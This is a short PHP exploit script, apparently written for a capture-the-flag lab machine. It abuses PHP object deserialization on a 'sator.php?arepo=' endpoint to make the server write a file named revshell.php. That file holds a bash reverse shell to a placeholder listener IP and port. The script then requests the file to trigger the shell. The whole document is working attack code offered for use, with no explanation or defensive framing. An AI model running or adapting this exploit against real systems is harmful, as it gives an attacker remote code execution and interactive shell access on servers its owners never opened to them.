<?php

class DatabaseExport
{
        public $user_file = 'revshell.php'; //free
        public $data = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/<ip>/<port> 0>&1\'");?>';

        public function update_db()
        {
                echo '[+] Grabbing users from text file <br>';
                $this-> data = 'Success';
        }

        public function __destruct()
        {
                file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
                echo '[+] unknown101 <br>';
        }
}

$url = 'http://10.10.10.223/sator.php?arepo=' . urlencode(serialize(new DatabaseExport)); //change class if needed!

print "==============================================================================\r\n";
print "[+] Enjoy";
print "[+] Check Listener\r\n";
print "==============================================================================\r\n";
$r = file_get_contents("$url");
$r = file_get_contents("http://10.10.10.223/revshell.php");
?>
